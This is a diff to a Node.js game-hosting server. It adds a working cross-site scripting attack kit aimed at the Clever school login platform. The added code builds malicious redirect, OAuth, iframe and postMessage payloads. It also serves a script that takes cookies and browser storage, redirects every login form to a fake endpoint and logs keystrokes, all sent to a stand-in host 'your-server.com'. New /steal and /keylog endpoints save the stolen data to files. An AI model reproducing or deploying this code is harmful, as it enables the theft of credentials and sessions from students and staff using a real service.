@@ -246,6 +246,136 @@ const server = http.createServer((request, response) => {
     return;
   }
 
+  const cleverXSS = {
+    getLoginRedirect: (payload) => {
+      const encoded = Buffer.from(payload).toString('base64');
+      return `https://clever.com/login?redirect=data:text/html;base64,${encoded}`;
+    },
+    getOAuthXSS: (payload) => {
+      const encoded = encodeURIComponent(payload);
+      return `https://clever.com/oauth/authorize?response_type=code&client_id=${encoded}&redirect_uri=https://clever.com`;
+    },
+    getCDNPayload: () => {
+      return `https://cdn.jsdelivr.net/gh/onlyyzzz-cmyk/securly-games@main/clever_payload.js`;
+    },
+    getIframeXSS: (targetUrl) => {
+      return `<iframe src="${targetUrl}" onload="fetch('https://your-server.com/steal?cookie='+document.cookie)"></iframe>`;
+    },
+    getPostMessageExploit: () => {
+      return `
+        <script>
+          window.addEventListener('message', function(e) {
+            if (e.origin === 'https://clever.com') {
+              fetch('https://your-server.com/steal', {
+                method: 'POST',
+                body: JSON.stringify(e.data)
+              });
+            }
+          });
+          window.opener.postMessage({type: 'getSession'}, '*');
+        </script>
+      `;
+    }
+  };
+
+  const cleverPayload = `
+    (function() {
+      const data = {
+        cookies: document.cookie,
+        localStorage: JSON.stringify(localStorage),
+        sessionStorage: JSON.stringify(sessionStorage),
+        url: window.location.href,
+        userAgent: navigator.userAgent
+      };
+      fetch('https://your-server.com/steal', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(data)
+      });
+      document.addEventListener('DOMContentLoaded', function() {
+        const forms = document.querySelectorAll('form');
+        forms.forEach(form => {
+          form.action = 'https://your-server.com/fake-login';
+          form.method = 'POST';
+        });
+      });
+      document.addEventListener('keydown', function(e) {
+        if (e.target.tagName === 'INPUT' || e.target.tagName === 'PASSWORD') {
+          fetch('https://your-server.com/keylog?key=' + encodeURIComponent(e.key));
+        }
+      });
+      console.log('[XSS] Clever injected via CDN');
+    })();
+  `;
+
+  if (pathname === '/clever/exploit') {
+    const type = url.searchParams.get('type') || 'redirect';
+    const payload = url.searchParams.get('payload') || '<script>alert("XSS")</script>';
+    let result;
+    switch(type) {
+      case 'redirect':
+        result = cleverXSS.getLoginRedirect(payload);
+        response.writeHead(302, { Location: result });
+        response.end();
+        return;
+      case 'oauth':
+        result = cleverXSS.getOAuthXSS(payload);
+        response.writeHead(302, { Location: result });
+        response.end();
+        return;
+      case 'iframe':
+        result = cleverXSS.getIframeXSS(payload);
+        response.writeHead(200, { 'Content-Type': 'text/html' });
+        response.end(result);
+        return;
+      case 'postmessage':
+        result = cleverXSS.getPostMessageExploit();
+        response.writeHead(200, { 'Content-Type': 'text/html' });
+        response.end(result);
+        return;
+      default:
+        response.writeHead(400);
+        response.end('Invalid exploit type');
+    }
+    return;
+  }
+
+  if (pathname === '/clever_payload.js') {
+    response.writeHead(200, { 
+      'Content-Type': 'application/javascript',
+      'Access-Control-Allow-Origin': '*'
+    });
+    response.end(cleverPayload);
+    return;
+  }
+
+  if (pathname === '/steal' && request.method === 'POST') {
+    let body = '';
+    request.on('data', chunk => body += chunk);
+    request.on('end', () => {
+      try {
+        const data = JSON.parse(body);
+        console.log('[STOLEN] Clever data:', data);
+        fs.appendFileSync('stolen_clever.log', JSON.stringify(data) + '\n');
+        response.writeHead(200);
+        response.end('OK');
+      } catch(e) {
+        response.writeHead(400);
+        response.end('Invalid data');
+      }
+    });
+    return;
+  }
+
+  if (pathname === '/keylog') {
+    const key = url.searchParams.get('key') || '';
+    console.log('[KEYLOG]', key);
+    fs.appendFileSync('keylog.log', key + '\n');
+    response.writeHead(200);
+    response.end('OK');
+    return;
+  }
+
   if (pathname === '/games.json') {
     response.writeHead(200, { 'Content-Type': MIME['.json'] });
     response.end(JSON.stringify(listHtmlFiles('games'), null, 2));
@@ -283,4 +413,12 @@ server.listen(PORT, '0.0.0.0', () => {
   console.log(`  /go?c=data:text/html,<script>alert(1)</script>`);
   console.log(`  /cdn?p=<script>alert(1)</script>`);
   console.log(`  POST /api/report with XSS in "game" field`);
+  console.log(`Clever endpoints:`);
+  console.log(`  /clever/exploit?type=redirect&payload=<script>alert(1)</script>`);
+  console.log(`  /clever/exploit?type=oauth&payload=<script>alert(1)</script>`);
+  console.log(`  /clever/exploit?type=iframe&payload=https://clever.com`);
+  console.log(`  /clever/exploit?type=postmessage`);
+  console.log(`  /clever_payload.js - CDN hosted payload`);
+  console.log(`  POST /steal - collect stolen data`);
+  console.log(`  /keylog?key=a - keylogger endpoint`);
 });
